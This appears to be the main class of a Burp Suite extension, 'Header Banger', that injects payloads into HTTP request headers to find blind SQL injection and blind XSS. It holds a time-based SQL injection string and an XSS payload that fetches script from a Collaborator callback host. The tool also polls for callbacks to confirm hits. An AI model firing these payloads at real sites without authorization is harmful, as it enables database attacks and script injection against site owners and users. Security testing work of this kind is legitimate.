package slicingmelon.burpheaderbanger;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.SecretKey;
import burp.api.montoya.persistence.PersistedObject;


import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.regex.Pattern;
import javax.swing.SwingUtilities;

public class BurpHeaderBanger implements BurpExtension {

    private static final String VERSION = "0.0.2";
    private static final int DEFAULT_SQLI_SLEEP_TIME = 17;
    
    public static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/png", "image/jpeg", "image/jpg", "image/gif",
            "video/webm", "video/mp4", "text/event-stream",
            "application/octet-stream", "font/woff", "font/woff2"
    );

    private MontoyaApi api;
    private PersistedObject persistedObject;
    private CollaboratorClient collaboratorClient;
    private ScheduledExecutorService scheduler;

    
    // Settings
    private boolean extensionActive = true;
    private boolean onlyInScopeItems = false;
    private int attackMode = 2; // 1 = Blind SQLi, 2 = Blind XSS
    private int sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
    
    // Headers and payloads
    private List<String> headers = new ArrayList<>();
    private List<String> sensitiveHeaders = new ArrayList<>();
    private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
    private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
    private List<Exclusion> exclusions = new ArrayList<>();
    private List<String> injectedHeaders = new ArrayList<>();
    private List<String> extraHeaders = new ArrayList<>();
    private boolean allowDuplicateHeaders = true; // true = allow duplicate headers, false = add only if not exists
    
    // 403 Alerts tracking
    private final List<Alert403Entry> alert403Entries = Collections.synchronizedList(new ArrayList<>());
    
    // UI Components
    private HeaderBangerTab headerBangerTab;
    
    // Request timing tracking
    private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
    
    // Default headers
    private static final List<String> DEFAULT_HEADERS = Arrays.asList(
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "True-Client-IP",
            "X-Client-IP",
            "X-Cluster-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "Fastly-Client-IP"
    );
    
    private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
            "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
            "X-HTTP-Host-Override"
    );
    
    // Default exclusions (regex patterns)
    private static final List<Exclusion> DEFAULT_EXCLUSIONS = Arrays.asList(
            new Exclusion(true, "player\\.vimeo\\.com"),
            new Exclusion(true, "example3\\.com")
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.persistedObject = api.persistence().extensionData();
        
        // Initialize collaborator client with secret key
        initializeCollaboratorClient();
        
        this.scheduler = Executors.newScheduledThreadPool(2);
        
        // Set extension name
        api.extension().setName("Header Banger");
        
        // Update injected headers
        updateInjectedHeaders();
        
        // Create helper classes
        AuditIssueBuilder auditIssueCreator = new AuditIssueBuilder(this, api);
        ProxyHandler proxyHandler = new ProxyHandler(this, api, auditIssueCreator, scheduler, collaboratorClient, requestTimestamps);
        ScanCheck scanCheck = new ScanCheck(this, api, scheduler, collaboratorClient, auditIssueCreator);
        
        // Create and register UI *before* loading settings that might affect it
        headerBangerTab = new HeaderBangerTab(this, api);
        api.userInterface().registerSuiteTab("Header Banger", headerBangerTab.getTabbedPane());
        
        // Load settings now that the UI is available
        loadSettings();
        
        // Explicitly refresh all UI lists to show the loaded data
        headerBangerTab.refreshAllLists();
        
        // Register handlers
        api.proxy().registerRequestHandler(proxyHandler);
        api.proxy().registerResponseHandler(proxyHandler);
        // Scanner registration commented out temporarily until we verify proper usage
        // api.scanner().registerActiveScanCheck(scanCheck);
        // api.scanner().registerPassiveScanCheck(scanCheck);
        api.userInterface().registerContextMenuItemsProvider(scanCheck);
        
        // Start simple collaborator interaction handler
        if (collaboratorClient != null) {
            startCollaboratorInteractionHandler(auditIssueCreator);
        }
        
        api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
    }
    
    private void startCollaboratorInteractionHandler(AuditIssueBuilder auditIssueCreator) {
        // Simple interaction handler that checks for interactions every 10 seconds
        scheduler.scheduleAtFixedRate(() -> {
            try {
                // Get all interactions
                var interactions = collaboratorClient.getAllInteractions();
                
                if (!interactions.isEmpty()) {
                    api.logging().logToOutput("Found " + interactions.size() + " collaborator interactions");
                    
                    for (var interaction : interactions) {
                        String interactionId = interaction.id().toString();
                        
                        // Search proxy history for requests containing this interaction ID
                        var proxyHistory = api.proxy().history(
                            requestResponse -> requestResponse.finalRequest().toString().contains(interactionId)
                        );
                        
                        if (!proxyHistory.isEmpty()) {
                            // Extract context directly from the proxy history entry
                            var requestResponse = proxyHistory.get(0); // Take the first match
                            var request = requestResponse.finalRequest();
                            
                            // Find which header contains the interaction ID
                            String headerName = null;
                            for (var header : request.headers()) {
                                if (header.value().contains(interactionId)) {
                                    headerName = header.name();
                                    break;
                                }
                            }
                            
                            if (headerName != null) {
                                api.logging().logToOutput("Found XSS interaction: " + interactionId + " for header " + headerName + " at " + request.url());
                                
                                // Create a PayloadCorrelation object with the extracted data
                                PayloadCorrelation correlation = new PayloadCorrelation(request.url(), headerName, request.method());
                                auditIssueCreator.createXssIssue(interaction, correlation);
                            } else {
                                api.logging().logToOutput("Interaction found but couldn't determine which header contained it: " + interactionId);
                            }
                        } else {
                            api.logging().logToOutput("Interaction found but no matching request in proxy history: " + interactionId);
                        }
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("Error checking collaborator interactions: " + e.getMessage());
            }
        }, 10, 10, java.util.concurrent.TimeUnit.SECONDS);
        
        api.logging().logToOutput("Started collaborator interaction handler (checking every 10 seconds)");
    }

    private void initializeCollaboratorClient() {
        try {
            // Get existing secret key from persistence
            String existingCollaboratorKey = persistedObject.getString("collaboratorSecretKey");
            
            if (existingCollaboratorKey != null && !existingCollaboratorKey.isEmpty()) {
                try {
                    api.logging().logToOutput("Creating Collaborator client from existing key");
                    this.collaboratorClient = api.collaborator().restoreClient(SecretKey.secretKey(existingCollaboratorKey));
                } catch (Exception e) {
                    api.logging().logToOutput("Failed to restore collaborator client, creating new one: " + e.getMessage());
                    this.collaboratorClient = api.collaborator().createClient();
                    persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
                }
            } else {
                api.logging().logToOutput("No previously found Collaborator client. Creating new client...");
                this.collaboratorClient = api.collaborator().createClient();
                
                // Save the secret key of the CollaboratorClient so that you can retrieve it later
                api.logging().logToOutput("Saving Collaborator secret key");
                persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
            }
            
            api.logging().logToOutput("Collaborator client initialized successfully");
        } catch (Exception e) {
            api.logging().logToError("Failed to initialize collaborator client: " + e.getMessage());
            // Fallback to creating a new client
            this.collaboratorClient = api.collaborator().createClient();
        }
    }

    private void loadSettings() {
        // Load extension active state
        if (persistedObject.getBoolean("extensionActive") != null) {
            extensionActive = persistedObject.getBoolean("extensionActive");
        }
        
        // Load only in scope setting
        if (persistedObject.getBoolean("onlyInScopeItems") != null) {
            onlyInScopeItems = persistedObject.getBoolean("onlyInScopeItems");
        }
        
        // Load attack mode
        if (persistedObject.getInteger("attackMode") != null) {
            attackMode = persistedObject.getInteger("attackMode");
            api.logging().logToOutput("DEBUG loadSettings: Loaded attack mode from persistence: " + attackMode);
        } else {
            api.logging().logToOutput("DEBUG loadSettings: No attack mode in persistence, using default: " + attackMode);
        }
        
        // Load headers
        String headersJson = persistedObject.getString("headers");
        if (headersJson != null && !headersJson.isEmpty()) {
            headers = new ArrayList<>(Arrays.asList(headersJson.split(",")));
        } else {
            headers = new ArrayList<>(DEFAULT_HEADERS);
        }
        
        // Load sensitive headers
        String sensitiveHeadersJson = persistedObject.getString("sensitiveHeaders");
        if (sensitiveHeadersJson != null && !sensitiveHeadersJson.isEmpty()) {
            sensitiveHeaders = new ArrayList<>(Arrays.asList(sensitiveHeadersJson.split(",")));
        } else {
            sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
        }
        
        // Load exclusions
        String exclusionsJson = persistedObject.getString("exclusions");
        api.logging().logToOutput("DEBUG loadSettings: Loading exclusions from persistence");
        api.logging().logToOutput("DEBUG loadSettings: Exclusions JSON from persistence: " + exclusionsJson);
        if (exclusionsJson != null && !exclusionsJson.isEmpty()) {
            exclusions = new ArrayList<>();
            String[] exclusionStrings = exclusionsJson.split("\\|\\|");
            for (String exclusionString : exclusionStrings) {
                if (!exclusionString.trim().isEmpty()) {
                    exclusions.add(Exclusion.fromJson(exclusionString));
                }
            }
            api.logging().logToOutput("DEBUG loadSettings: Loaded " + exclusions.size() + " exclusions from persistence");
        } else {
            // Check for legacy skipHosts migration
            String skipHostsJson = persistedObject.getString("skipHosts");
            if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
                // Migrate from old skipHosts format to regex patterns
                exclusions = new ArrayList<>();
                List<String> legacySkipHosts = Arrays.asList(skipHostsJson.split(","));
                for (String host : legacySkipHosts) {
                    String regexPattern = host.replace(".", "\\.");
                    exclusions.add(new Exclusion(true, regexPattern));
                }
                api.logging().logToOutput("DEBUG loadSettings: Migrated " + exclusions.size() + " exclusions from skipHosts");
                // Clear skipHosts after migration
                persistedObject.setString("skipHosts", "");
            } else {
                // Use default exclusions
                exclusions = new ArrayList<>(DEFAULT_EXCLUSIONS);
                api.logging().logToOutput("DEBUG loadSettings: Using " + exclusions.size() + " default exclusions");
            }
        }
        
        // Load payloads
        String sqliPayloadSetting = persistedObject.getString("sqliPayload");
        if (sqliPayloadSetting != null && !sqliPayloadSetting.isEmpty()) {
            sqliPayload = sqliPayloadSetting;
        }
        
        String bxssPayloadSetting = persistedObject.getString("bxssPayload");
        if (bxssPayloadSetting != null && !bxssPayloadSetting.isEmpty()) {
            bxssPayload = bxssPayloadSetting;
        }
        
        // Load SQL injection sleep time
        if (persistedObject.getInteger("sqliSleepTime") != null) {
            sqliSleepTime = persistedObject.getInteger("sqliSleepTime");
        }
        
        // Load extra headers
        String extraHeadersJson = persistedObject.getString("extraHeaders");
        if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
            extraHeaders = new ArrayList<>(Arrays.asList(extraHeadersJson.split(",")));
        } else {
            extraHeaders = new ArrayList<>();
        }
        
        // Load allow duplicate headers setting
        if (persistedObject.getBoolean("allowDuplicateHeaders") != null) {
            allowDuplicateHeaders = persistedObject.getBoolean("allowDuplicateHeaders");
        }
        // Always refresh the exclusions table if the UI is already created
        if (headerBangerTab != null) headerBangerTab.refreshExclusionsTable();
    }

    public void saveSettings() {
        // Save extension active state
        persistedObject.setBoolean("extensionActive", extensionActive);
        
        // Save only in scope setting
        persistedObject.setBoolean("onlyInScopeItems", onlyInScopeItems);
        
        // Save attack mode
        persistedObject.setInteger("attackMode", attackMode);
        api.logging().logToOutput("DEBUG saveSettings: Saved attack mode to persistence: " + attackMode);
        
        // Save headers
        persistedObject.setString("headers", String.join(",", headers));
        
        // Save sensitive headers
        persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
        
        // Save skip hosts (legacy support - keep empty after migration)
        persistedObject.setString("skipHosts", "");
        
        // Save exclusions
        List<String> exclusionJsonList = new ArrayList<>();
        for (Exclusion exclusion : exclusions) {
            exclusionJsonList.add(exclusion.toJson());
        }
        String exclusionsJsonString = String.join("||", exclusionJsonList);
        api.logging().logToOutput("DEBUG saveSettings: Saving " + exclusions.size() + " exclusions");
        api.logging().logToOutput("DEBUG saveSettings: Exclusions JSON: " + exclusionsJsonString);
        persistedObject.setString("exclusions", exclusionsJsonString);
        
        // Save payloads
        persistedObject.setString("sqliPayload", sqliPayload);
        persistedObject.setString("bxssPayload", bxssPayload);
        
        // Save SQL injection sleep time
        persistedObject.setInteger("sqliSleepTime", sqliSleepTime);
        
        // Debug logging for extra headers save
        api.logging().logToOutput("DEBUG saveSettings: Saving " + extraHeaders.size() + " extra headers: " + extraHeaders);
        api.logging().logToOutput("DEBUG saveSettings: Extra headers as string: '" + String.join(",", extraHeaders) + "'");
        api.logging().logToOutput("DEBUG saveSettings: allowDuplicateHeaders setting: " + allowDuplicateHeaders);
        
        persistedObject.setString("extraHeaders", String.join(",", extraHeaders));
        persistedObject.setBoolean("allowDuplicateHeaders", allowDuplicateHeaders);
    }

    // Getters and setters
    public boolean isExtensionActive() { return extensionActive; }
    public void setExtensionActive(boolean active) { this.extensionActive = active; }

    public boolean isOnlyInScopeItems() { return onlyInScopeItems; }
    public void setOnlyInScopeItems(boolean onlyInScopeItems) { this.onlyInScopeItems = onlyInScopeItems; }

    public int getAttackMode() { return attackMode; }
    public void setAttackMode(int attackMode) { this.attackMode = attackMode; }

    public int getSqliSleepTime() { return sqliSleepTime; }
    public void setSqliSleepTime(int sqliSleepTime) { this.sqliSleepTime = sqliSleepTime; }

    public List<String> getHeaders() { return headers; }
    public void setHeaders(List<String> headers) { this.headers = headers; }

    public List<String> getSensitiveHeaders() { return sensitiveHeaders; }
    public void setSensitiveHeaders(List<String> sensitiveHeaders) { this.sensitiveHeaders = sensitiveHeaders; }

    public String getSqliPayload() { return sqliPayload; }
    public void setSqliPayload(String sqliPayload) { this.sqliPayload = sqliPayload; }

    public String getBxssPayload() { return bxssPayload; }
    public void setBxssPayload(String bxssPayload) { this.bxssPayload = bxssPayload; }



    public List<Exclusion> getExclusions() { return exclusions; }
    public void setExclusions(List<Exclusion> exclusions) { this.exclusions = exclusions; }

    public List<String> getInjectedHeaders() { return injectedHeaders; }
    public void setInjectedHeaders(List<String> injectedHeaders) { this.injectedHeaders = injectedHeaders; }

    public List<String> getExtraHeaders() { return extraHeaders; }
    public void setExtraHeaders(List<String> extraHeaders) { this.extraHeaders = extraHeaders; }

    public boolean isAllowDuplicateHeaders() { return allowDuplicateHeaders; }
    public void setAllowDuplicateHeaders(boolean allow) { this.allowDuplicateHeaders = allow; }

    public CollaboratorClient getCollaboratorClient() { return collaboratorClient; }

    public HeaderBangerTab getHeaderBangerTab() { return headerBangerTab; }

    public void updateInjectedHeaders() {
        this.injectedHeaders.clear();
        this.injectedHeaders.addAll(headers);
        this.injectedHeaders.addAll(sensitiveHeaders);
    }

    public List<String> getDefaultHeaders() { return new ArrayList<>(DEFAULT_HEADERS); }
    public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }
    public List<Exclusion> getDefaultExclusions() { return new ArrayList<>(DEFAULT_EXCLUSIONS); }

    public Map<String, Long> getRequestTimestamps() { return requestTimestamps; }
    
    // Exclusion methods
    public boolean isExcluded(String url, String host) {
        for (Exclusion exclusion : exclusions) {
            if (exclusion.matches(url) || exclusion.matches(host)) {
                api.logging().logToOutput("[EXCLUSION] Request excluded by pattern: " + exclusion.getPattern());
                return true;
            }
        }
        return false;
    }
    
    public void addExclusion(String pattern) {
        // Prevent duplicates
        for (Exclusion exclusion : exclusions) {
            if (exclusion.getPattern().equals(pattern)) {
                api.logging().logToOutput("Exclusion already exists: " + pattern);
                return;
            }
        }
        
        // Test the pattern compilation first
        try {
            Pattern.compile(pattern);
        } catch (Exception e) {
            api.logging().logToError("[ERROR] Invalid regex pattern: " + pattern + " - " + e.getMessage());
            return;
        }
        
        Exclusion newExclusion = new Exclusion(true, pattern);
        exclusions.add(newExclusion);
        api.logging().logToOutput("Added exclusion: " + pattern + ". Total exclusions: " + exclusions.size());
        
        // Save settings immediately after adding
        api.logging().logToOutput("Saving exclusion settings to persistence...");
        saveSettings();
        api.logging().logToOutput("Exclusion settings saved. Refreshing UI...");
        
        // Refresh UI on the EDT to avoid threading issues
        api.logging().logToOutput("HeaderBangerTab reference is: " + (headerBangerTab != null ? "NOT NULL" : "NULL"));
        if (headerBangerTab != null) {
            // Try both approaches to see which one works
            SwingUtilities.invokeLater(() -> {
                api.logging().logToOutput("About to try single exclusion add method");
                headerBangerTab.addExclusionToTable(newExclusion);
                
                // Also try the full refresh as backup
                api.logging().logToOutput("About to call refreshExclusionsTable() from EDT as backup");
                headerBangerTab.refreshExclusionsTable();
                api.logging().logToOutput("Both UI update methods called. Current exclusions count: " + exclusions.size());
            });
        } else {
            api.logging().logToOutput("WARNING: HeaderBangerTab is null, cannot refresh UI");
        }
    }
    
    public void addHostExclusion(String host) {
        // Create a simple regex pattern that matches the host anywhere in the URL
        // Escape dots in hostname for regex
        String regexPattern = host.replace(".", "\\.");
        addExclusion(regexPattern);
    }
    
    public void addUrlExclusion(String url) {
        // Create a regex pattern that matches the exact URL
        // Escape special regex characters in URL
        String regexPattern = url.replace(".", "\\.").replace("?", "\\?").replace("*", "\\*").replace("+", "\\+").replace("[", "\\[").replace("]", "\\]").replace("(", "\\(").replace(")", "\\)").replace("{", "\\{").replace("}", "\\}").replace("^", "\\^").replace("$", "\\$").replace("|", "\\|");
        addExclusion(regexPattern);
    }
    
    // 403 Alerts management methods
    public List<Alert403Entry> getAlert403Entries() {
        return new ArrayList<>(alert403Entries);
    }
    
    public void addAlert403Entry(Alert403Entry entry) {
        alert403Entries.add(entry);
        api.logging().logToOutput("[403_ALERT] Added 403 alert: " + entry.toString());
        
        // Notify UI to refresh the 403 alerts table
        if (headerBangerTab != null) {
            SwingUtilities.invokeLater(() -> {
                headerBangerTab.refresh403AlertsTable();
            });
        }
    }
    
    public void clearAlert403Entries() {
        alert403Entries.clear();
        api.logging().logToOutput("[403_ALERT] Cleared all 403 alerts");
        
        // Notify UI to refresh the 403 alerts table
        if (headerBangerTab != null) {
            SwingUtilities.invokeLater(() -> {
                headerBangerTab.refresh403AlertsTable();
            });
        }
    }

    public void extractSqliSleepTime() {
        // Extract sleep time from SQL injection payload
        String payload = sqliPayload.toLowerCase();
        if (payload.contains("sleep(")) {
            int start = payload.indexOf("sleep(") + 6;
            int end = payload.indexOf(")", start);
            if (end > start) {
                try {
                    String sleepTimeStr = payload.substring(start, end);
                    int extractedTime = Integer.parseInt(sleepTimeStr);
                    if (extractedTime > 0 && extractedTime <= 60) {
                        this.sqliSleepTime = extractedTime;
                        api.logging().logToOutput("Extracted SQL injection sleep time: " + extractedTime + " seconds");
                    }
                } catch (NumberFormatException e) {
                    api.logging().logToOutput("Could not extract sleep time from payload, using default: " + DEFAULT_SQLI_SLEEP_TIME);
                    this.sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
                }
            }
        }
    }

    // Shutdown method
    public void shutdown() {
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
}

